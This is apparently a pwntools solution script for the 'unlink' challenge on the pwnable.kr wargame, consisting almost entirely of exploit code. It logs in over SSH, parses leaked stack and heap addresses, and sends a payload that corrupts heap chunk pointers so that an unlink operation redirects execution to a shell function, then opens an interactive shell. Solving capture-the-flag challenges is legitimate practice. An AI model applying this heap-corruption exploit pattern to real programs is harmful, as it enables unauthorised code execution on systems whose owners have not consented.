from pwn import *

shell_addr = 0x080484eb

s = ssh(host='pwnable.kr',port=2222,user='unlink',password='guest')
p = s.process("./unlink")
p.recvuntil("here is stack address leak: ")
stack_addr = p.recv(10)
print(stack_addr)
stack_addr = int(stack_addr,16)
p.recvuntil("here is heap address leak: ")
heap_addr = p.recv(9)
print(heap_addr)
heap_addr = int(heap_addr,16)
payload = p32(shell_addr)
payload += b'a' * 12
#payload += p32(heap_addr + 12)
#payload += p32(stack_addr + 0x10)
payload += p32(stack_addr + 12)
payload += p32(heap_addr + 12)
p.send(payload)
p.interactive()
